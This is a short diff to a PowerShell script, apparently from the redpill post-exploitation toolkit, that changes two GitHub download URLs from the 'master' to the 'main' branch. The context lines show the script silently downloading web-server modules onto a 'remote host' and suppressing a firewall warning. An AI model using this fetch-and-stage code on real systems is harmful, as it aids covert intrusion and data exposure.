@@ -46,7 +46,7 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
     If($StartWebServer -ieq "Python"){## Python http.server sellected as webserver
         If(-not(Test-Path -Path "$Env:TMP\webserver.ps1")){## Make sure auxiliary module exists on remote host
             Write-Host "[+] Task      : Downloading webserver.ps1 from github" -ForegroundColor Green
-            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/master/modules/webserver.ps1 -Destination $Env:TMP\webserver.ps1 -ErrorAction SilentlyContinue|Out-Null   
+            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/webserver.ps1 -Destination $Env:TMP\webserver.ps1 -ErrorAction SilentlyContinue|Out-Null   
          }
 
          ## Check downloaded file integrity
@@ -65,7 +65,7 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
         If($IsClientAdmin){## Start-WebServer requires Administrator rigths to run
             If(-not(Test-Path -Path "$Env:TMP\Start-WebServer.ps1")){## Make sure auxiliary module exists on remote host
                 Write-Host "[+] Task      : Downloading Start-WebServer.ps1 from github" -ForegroundColor Green
-                Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/master/modules/Start-Webserver.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
+                Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Start-Webserver.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
             }
 
             ## Add firewall rule to prevent connection detected warning msgbox
